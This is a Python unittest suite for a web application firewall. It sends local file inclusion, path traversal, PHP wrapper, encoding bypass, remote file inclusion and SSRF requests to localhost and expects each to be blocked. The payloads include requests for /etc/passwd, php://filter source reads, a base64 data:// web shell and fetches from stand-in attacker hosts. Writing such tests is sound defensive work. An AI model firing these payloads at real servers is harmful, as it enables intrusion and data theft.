import unittest
import requests

"""
WARNING 

THESE TESTS WILL NOT WORK WITH HTTPS

To run these test please disable HTTPS on your web server, and then run the test_rules.py file
"""


class TestFileInclusion(unittest.TestCase):
    def setUp(self):
        """
        Set testing details
        :return:
        """
        self.domain = "localhost:8000"
        self.url = "http://" + self.domain + "/"

    def test_sanity(self):
        """
        Sanity test to check that unit tests is working (is true = true?)
        :return: success if true=true
        """
        self.assertEqual(True, True)

    def test_good_packet(self):
        """
        Test for false positives on good URLs
        :return: success if response is not 403 status code
        """
        urls = ["",
                "WebGoat",
                "WebGoat/login?error",
                "WebGoat/register.mvc",
                "index.php"]

        for i in urls:
            with self.subTest(i=i):
                response = requests.get(self.url + i)
                self.assertNotEqual(403, response.status_code,
                                    "False Positive on URL '" + self.url + i + "'" + " with status code " + str(
                                        response.status_code))

    def test_path_traversal(self):
        """
        Test for path traversal
        :return: success if response is 403 status code
        """
        urls = ["index.php?page=../../../etc/passwd",
                "index.php?page=....//....//....//etc/passwd",
                "index.php?page=....\/....\/....\/etc/passwd"]

        for i in urls:
            with self.subTest(i=i):
                response = requests.get(self.url + i)
                self.assertEqual(403, response.status_code,
                                 "False Negative on URL '" + self.url + i + "'" + " with status code " + str(
                                     response.status_code))

    def test_php_wrapper(self):
        """
        Test for PHP wrappers
        :return: success if response is 403 status code
        """
        urls = ["index.php?page=php://filter/read=string.rot13/resource=index.php",
                "index.php?page=php://filter/convert.base64-encode/resource=index.php",
                "index.php?page=pHp://FilTer/convert.base64-encode/resource=index.php",
                "index.php?page=php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd",
                "index.php?page=zip://shell.jpg%23payload.php",
                "?page=data://text/plain,<?php echo base64_encode(file_get_contents(“index.php”)); ?>\"",
                "?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4="]

        for i in urls:
            with self.subTest(i=i):
                response = requests.get(self.url + i)
                self.assertEqual(403, response.status_code,
                                 "False Negative on URL '" + self.url + i + "'" + " with status code " + str(
                                     response.status_code))

    def test_encoding(self):
        """
        Test for obfuscation through encoding
        :return: success if response is 403 status code
        """
        urls = ["index.php?page=..%252f..%252f..%252fetc%252fpasswd",
                "index.php?page=..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
                "index.php?page=%252e%252e%252fetc%252fpasswd",
                "index.php?page=%252e%252e%252fetc%252fpasswd%00"]

        for i in urls:
            with self.subTest(i=i):
                response = requests.get(self.url + i)
                self.assertEqual(403, response.status_code,
                                 "False Negative on URL '" + self.url + i + "'" + " with status code " + str(
                                     response.status_code))

    def test_null_byte_injection(self):
        """
        Test for null byte injection
        :return: success if response is 403 status code
        """
        urls = ["index.php?page=../../../etc/passwd%00"]

        for i in urls:
            with self.subTest(i=i):
                response = requests.get(self.url + i)
                self.assertEqual(403, response.status_code,
                                 "False Negative on URL '" + self.url + i + "'" + " with status code " + str(
                                     response.status_code))

    def test_access_folder(self):
        """
        Test for access folder through path traversal
        :return:  success if response is 403 status code
        """
        urls = ["index.php?page=utils/scripts/../../../../../etc/passwd"]

        for i in urls:
            with self.subTest(i=i):
                response = requests.get(self.url + i)
                self.assertEqual(403, response.status_code,
                                 "False Negative on URL '" + self.url + i + "'" + " with status code " + str(
                                     response.status_code))

    def test_path_truncation(self):
        """
        Test for path traversal through path truncation
        :return: success if response is 403 status code
        """
        urls = ["index.php?page=a/../../../../../../../../../etc/passwd..\.\.\.\.\.\.\.\.\.\.\.\.",
                "index.php?page=a/../../../../../../../../../etc/passwd/./././././.",
                "index.php?page=a/././etc/passwd",
                "index.php?page=a/../../../../../../../../../etc/passwd"]

        for i in urls:
            with self.subTest(i=i):
                response = requests.get(self.url + i)
                self.assertEqual(403, response.status_code,
                                 "False Negative on URL '" + self.url + i + "'" + " with status code " + str(
                                     response.status_code))

    def test_rfi(self):
        """
        Test for remote file inclusion
        :return: success if response is 403 status code
        """
        urls = ["index.php?page=http://atacker.com/evil.php",
                "index.php?page=\\attacker.com\evil.php"]

        for i in urls:
            with self.subTest(i=i):
                response = requests.get(self.url + i)
                self.assertEqual(403, response.status_code,
                                 "False Negative on URL '" + self.url + i + "'" + " with status code " + str(
                                     response.status_code))

    def test_filter_bypass(self):
        """
        Test for filter bypasses
        :return: success if response is 403 status code
        """
        urls = ["index.php?page=....//....//etc/passwd",
                "index.php?page=..///////..////..//////etc/passwd",
                "index.php?page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd",
                "index.php?page=/var/www/../../etc/passwd",
                "index.php?page=../../../etc/passwd",
                "index.php?page=....//....//....//etc/passwd",
                "index.php?page=....\/....\/....\/etc/passwd",
                "static/%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd"]

        for i in urls:
            with self.subTest(i=i):
                response = requests.get(self.url + i)
                self.assertEqual(403, response.status_code,
                                 "False Negative on URL '" + self.url + i + "'" + " with status code " + str(
                                     response.status_code))

    def test_ssrf_wrappers(self):
        """
        Test for server side request forgery through wrappers
        :return:  success if response is 403 status code
        """
        urls = ["foo/bar?vuln-function=http://127.0.0.1:8888/secret",
                "index?page=dict://",
                "index?page=expect://",
                "index?page=fd://",
                "index?page=file://",
                "index?page=file:///",
                "index?page=ftp://",
                "index?page=gopher://",
                "index?page=http://",
                "index?page=https://",
                "index?page=imap://",
                "index?page=jar:ftp://local-domain.com!/",
                "index?page=jar:http://0.0.0.0!/",
                "index?page=jar:http://127.0.0.1!/",
                "index?page=jar:http://localhost!/",
                "index?page=jar:proto-schema://blah!/",
                "index?page=ldap://",
                "index?page=mailto://",
                "index?page=netdoc:///etc/hosts",
                "index?page=netdoc:///etc/passwd",
                "index?page=ogg://",
                "index?page=pop3://",
                "index?page=sftp://",
                "index?page=smtp://",
                "index?page=ssh2://",
                "index?page=ssh://",
                "index?page=telnet://",
                "index?page=tftp://"]

        for i in urls:
            with self.subTest(i=i):
                response = requests.get(self.url + i)
                self.assertEqual(403, response.status_code,
                                 "False Negative on URL '" + self.url + i + "'" + " with status code " + str(
                                     response.status_code))


if __name__ == '__main__':
    unittest.main()
